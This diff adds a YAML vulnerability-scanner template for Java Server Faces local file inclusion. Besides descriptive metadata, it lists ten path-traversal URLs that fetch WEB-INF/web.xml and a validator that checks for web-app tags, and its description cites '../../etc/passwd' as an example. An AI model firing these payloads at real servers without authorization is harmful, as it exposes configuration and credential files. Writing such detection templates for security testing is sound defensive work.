@@ -1,0 +1,66 @@
+id: JAVA_SERVER_FACES_LFI
+info:
+  name: "Java Server Faces Local File Inclusion"
+  description: "Java Server Faces (JSF) Local File Inclusion (LFI) is a vulnerability in web applications that use JSF, where an attacker can include local files from the server by manipulating user input. This often occurs when the application fails to properly validate or sanitize input parameters that specify file paths. By exploiting this vulnerability, attackers can access sensitive files on the server, such as configuration files or source code, potentially leading to information disclosure or further exploitation. Proper input validation and path sanitization are crucial to prevent LFI attacks."
+  details:  "Java Server Faces (JSF) Local File Inclusion (LFI) occurs when user-supplied input, such as file paths or filenames, is improperly handled by the JSF application. If the application allows users to request local files without validating the input, attackers can manipulate the file path to access files outside the intended directory, potentially revealing sensitive information. For example, by providing a path like ../../etc/passwd, an attacker could access the server’s password file. Mitigating this requires proper input validation, restricting file access, and using secure coding practices."
+  impact: "The impact of Java Server Faces (JSF) Local File Inclusion (LFI) can be severe, as it allows attackers to access sensitive files on the server, such as configuration files, credentials, or even source code. This can lead to information disclosure, unauthorized access, or further exploitation of the system. By exploiting LFI, attackers may also escalate their privileges, compromise application integrity, or prepare the system for more advanced attacks, such as remote code execution."
+  category:
+    name: LFI
+    shortName: Local File Inclusion
+    displayName: Local File Inclusion (LFI)
+  subCategory: JAVA_SERVER_FACES_LFI
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+  cwe:
+    - CWE-98
+    - CWE-22
+  cve:
+    - CVE-2021-39433
+    - CVE-2023-22973
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+wordLists:
+  paths:
+    - "/costModule/faces/javax.faces.resource/web.xml?loc=../WEB-INF"
+    - "/costModule/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.."
+    - "/faces/javax.faces.resource/web.xml?loc=../WEB-INF"
+    - "/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.."
+    - "/secureader/javax.faces.resource/web.xml?loc=../WEB-INF"
+    - "/secureader/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.."
+    - "/myaccount/javax.faces.resource/web.xml?loc=../WEB-INF"
+    - "/myaccount/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.."
+    - "/SupportPortlet/faces/javax.faces.resource/web.xml?loc=../WEB-INF"
+    - "/SupportPortlet/faces/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.."
+execute:
+  type: single
+  requests:
+    - req:
+      - modify_url: "${paths}"
+      - modify_method: GET
+      - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  response_payload:
+    length:
+      gt: 0
+    contains_all:
+      - "<web-app"
+      - "</web-app>"
+strategy:
+  run_once: /
